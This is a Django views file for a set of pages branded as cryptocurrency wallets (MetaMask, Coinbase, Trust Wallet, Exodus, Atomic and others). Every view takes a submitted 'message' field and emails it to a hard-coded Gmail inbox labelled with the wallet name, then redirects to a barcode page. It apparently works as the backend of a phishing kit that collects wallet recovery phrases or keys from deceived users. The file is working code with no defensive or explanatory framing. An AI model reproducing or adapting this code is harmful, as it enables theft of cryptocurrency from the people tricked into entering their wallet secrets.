from django.shortcuts import render, redirect
from django.http import HttpResponseRedirect, HttpResponse
from django.views.generic import TemplateView

from django.core.mail import send_mail



def index(request):
    return render(request,'index.html')

def barcode(request):
    return render(request,'barcode.html')
	
def input(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'Metamask wallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'input.html') 



def coinbase(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		} 
		
		send_mail(
            'Bitcoin',
            'coinbase wallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'coinbase.html') 

	
	
def alphawallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'alphawallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'alphawallet.html') 
	


def argentwallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'argentwallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'argentwallet.html') 
	
	
def metamask(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'metamask : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'metamask.html') 
	
	
def trustwallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'trustwallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'trustwallet.html') 
	

def exodus(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'exodus : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'exodus.html') 
	


def infinitowallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'infinitowallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'infinito.html') 

 
	
def atomic(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'atomic: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'atomic.html') 
	
	


def tokenpocket(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'token pocket wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'tokenpocket.html') 
	




def atwallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'atwallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'atwallet.html') 
	

def unstoppable(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'unstoppable wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['codewithsmile00@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'unstoppable.html') 

	
	
	
